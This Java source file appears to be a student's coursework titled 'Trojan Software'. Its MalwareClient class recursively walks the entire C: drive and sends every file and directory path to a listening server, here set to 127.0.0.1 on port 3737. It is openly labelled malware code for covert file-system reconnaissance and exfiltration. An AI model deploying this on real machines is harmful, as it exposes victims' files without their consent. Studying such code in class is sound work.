// Abigail McIntyre
// Project 4 - Trojan Software
// Due 03/16/2022

// ---------------------------------------------------------------------------------------------------------------------------
// The client part of the program. It goes through all of the files and sends them to the server
// ---------------------------------------------------------------------------------------------------------------------------

import java.io.File;

public class MalwareClient 
{
    Talker talker;
    File directory;

    // ======================================================================================

    MalwareClient()
    {
        System.out.println("Client being created");
        talker = new Talker("127.0.0.1", 3737, "client");
        System.out.println("Client is ready to receive...");

        directory = new File("C:/");                                    // look through the C: drive
        showFiles(directory.listFiles());                               // call method to go through the list of files in each directory
        talker.sendString("DONE");                                      // end the receiving of file names in the ctc
    }

    // ======================================================================================

    public void showFiles(File[] files) 
    {
        for (File file : files) 
        {
            if (file.isDirectory())                                     // if the file is a directory
            {
                talker.sendString("Directory: " + file.getPath());      // send the path name and say it's a directory
                showFiles(file.listFiles());                            // and then call the function again using that directory            
            }   
            else 
            {
                talker.sendString("File: " + file.getPath());           // if it's just a file, print it and move on to the next file
            }
        }
    }

    // ======================================================================================

}
